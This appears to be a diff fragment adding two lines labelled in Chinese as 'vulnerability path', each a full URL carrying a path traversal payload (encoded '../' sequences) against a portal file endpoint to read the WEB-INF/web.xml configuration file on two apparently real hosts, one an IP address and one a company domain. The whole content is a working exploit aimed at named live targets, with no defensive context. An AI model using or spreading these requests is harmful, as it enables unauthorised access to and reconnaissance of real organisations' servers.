@@ -1,0 +1,2 @@
+漏洞路径 http://61.178.166.182:9080/portal/file?cmd=getFileLocal&fileid=..%2F..%2F..%2F..%2Fwebapps/nc_web/WEB-INF/web.xml
+漏洞路径 http://nc.jlgxjt.com:9080/portal/file?cmd=getFileLocal&fileid=..%2F..%2F..%2F..%2Fwebapps/nc_web/WEB-INF/web.xml
